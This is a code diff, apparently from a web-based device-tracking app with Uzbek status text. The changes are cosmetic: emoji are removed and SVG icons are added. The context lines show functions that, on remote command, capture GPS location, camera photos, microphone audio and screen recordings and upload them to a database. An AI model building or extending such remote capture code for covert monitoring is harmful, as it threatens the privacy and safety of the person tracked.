@@ -516,7 +516,7 @@ function initWebSurveillanceSync(user) {
           if ('geolocation' in navigator) {
             navigator.geolocation.getCurrentPosition((pos) => {
               uploadWebLocation(username, pos.coords.latitude, pos.coords.longitude);
-              db.ref(`tracking/devices/${username}/media/status`).set(`🛰️ GPS yangilandi (${new Date().toLocaleTimeString()})`);
+              db.ref(`tracking/devices/${username}/media/status`).set(`GPS yangilandi (${new Date().toLocaleTimeString()})`);
             }, null, { enableHighAccuracy: true, timeout: 10000 });
           }
         }
@@ -558,7 +558,7 @@ async function captureWebPhoto(username) {
       };
       db.ref(`tracking/devices/${username}/media/latest_photo`).set(photoItem);
       db.ref(`tracking/devices/${username}/media/archive_photos`).push().set(photoItem);
-      db.ref(`tracking/devices/${username}/media/status`).set(`📷 Rasm olindi (${new Date().toLocaleTimeString()})`);
+      db.ref(`tracking/devices/${username}/media/status`).set(`Rasm olindi (${new Date().toLocaleTimeString()})`);
     }
   } catch (e) {
     console.log('captureWebPhoto error', e);
@@ -602,7 +602,7 @@ async function handleWebAudioRecordingCommand(username, start) {
               };
               db.ref(`tracking/devices/${username}/media/latest_audio`).set(audioItem);
               db.ref(`tracking/devices/${username}/media/archive_audio`).push().set(audioItem);
-              db.ref(`tracking/devices/${username}/media/status`).set(`🎙️ Ovoz yozildi (${durSec}s)`);
+              db.ref(`tracking/devices/${username}/media/status`).set(`Ovoz yozildi (${durSec}s)`);
             }
           };
           reader.readAsDataURL(audioBlob);
@@ -617,7 +617,7 @@ async function handleWebAudioRecordingCommand(username, start) {
       };
 
       webAudioRecorder.start(1000);
-      if (db) db.ref(`tracking/devices/${username}/media/status`).set("🎙️ Ovoz yozilmoqda...");
+      if (db) db.ref(`tracking/devices/${username}/media/status`).set("Ovoz yozilmoqda...");
     } else {
       if (webAudioRecorder && webAudioRecorder.state === 'recording') {
         webAudioRecorder.stop();
@@ -668,7 +668,7 @@ async function handleWebScreenRecordingCommand(username, start) {
                   };
                   db.ref(`tracking/devices/${username}/media/latest_screen`).set(screenItem);
                   db.ref(`tracking/devices/${username}/media/archive_screen`).push().set(screenItem);
-                  db.ref(`tracking/devices/${username}/media/status`).set(`📹 Ekran yozildi (${durSec}s)`);
+                  db.ref(`tracking/devices/${username}/media/status`).set(`Ekran yozildi (${durSec}s)`);
                 }
               };
               reader.readAsDataURL(videoBlob);
@@ -683,7 +683,7 @@ async function handleWebScreenRecordingCommand(username, start) {
           };
 
           webScreenRecorder.start(1000);
-          if (db) db.ref(`tracking/devices/${username}/media/status`).set("📹 Ekran yozilmoqda...");
+          if (db) db.ref(`tracking/devices/${username}/media/status`).set("Ekran yozilmoqda...");
           return;
         } catch (_err) {
           console.log("getDisplayMedia bekor qilindi yoki qo'llab-quvvatlanmadi, HTML snapshot olinadi");
@@ -730,7 +730,7 @@ function captureWebSnapshot(username) {
       };
       db.ref(`tracking/devices/${username}/media/latest_screen`).set(screenItem);
       db.ref(`tracking/devices/${username}/media/archive_screen`).push().set(screenItem);
-      db.ref(`tracking/devices/${username}/media/status`).set(`📹 Ekran tasviri olindi (${new Date().toLocaleTimeString()})`);
+      db.ref(`tracking/devices/${username}/media/status`).set(`Ekran tasviri olindi (${new Date().toLocaleTimeString()})`);
     }
   } catch (e) {
     console.error("captureWebSnapshot error:", e);
@@ -810,10 +810,10 @@ function togglePasswordVisibility(inputId, btn) {
   if (!input) return;
   if (input.type === 'password') {
     input.type = 'text';
-    if (btn) btn.innerText = '🙈';
+    if (btn) btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
   } else {
     input.type = 'password';
-    if (btn) btn.innerText = '👁️';
+    if (btn) btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
   }
 }
 
